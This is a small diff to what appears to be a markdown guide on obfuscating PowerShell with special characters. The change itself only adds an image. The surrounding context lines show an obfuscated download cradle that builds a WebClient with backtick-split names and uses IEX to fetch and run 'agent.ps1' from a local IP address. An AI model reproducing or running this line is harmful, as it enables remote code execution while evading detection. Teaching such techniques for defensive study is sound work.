@@ -115,6 +115,8 @@ The above string can be obfuscated using **powershell special caracters:** **`**
       $get = New-Object "N`et`Web`Cl`ie`nt"
       p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
 
+![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
+
 ---
 
 <br /><br /><br />
